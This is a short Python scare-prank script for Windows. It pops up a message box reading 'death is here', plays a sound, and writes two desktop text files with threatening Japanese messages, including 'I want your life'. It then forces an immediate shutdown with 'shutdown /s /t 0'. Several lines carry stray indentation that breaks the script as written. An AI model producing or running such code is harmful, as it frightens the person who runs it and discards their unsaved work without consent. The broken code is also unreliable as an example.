import ctypes
import time
import os
from playsound import playsound


from tkinter import Tk, Label
from PIL import Image, ImageTk


ctypes.windll.user32.MessageBoxW(0, "𝖉ℯ𝖆𝓉𝖍 𝖎𝓈 𝒽𝖊𝓇𝖊.", "ERROR", 0)


time.sleep(2)

playsound(r"C:\Users\MERT\breath.mp3", block=True)




desktop = os.path.join(os.path.expanduser("~"), "Desktop")


file_path = os.path.join(desktop, "am i dead.txt")
with open(file_path, "w", encoding="utf-8") as f:
    f.write("それは全部あなたのお父さんのせいよ")
   time.sleep(15) 
file_path = os.path.join(desktop, "gonna take yours.txt")
with open(file_path, "w", encoding="utf-8") as f:
    f.write("あなたの命が欲しいです")
 

time.sleep(45)


 os.system("shutdown /s /t 0")



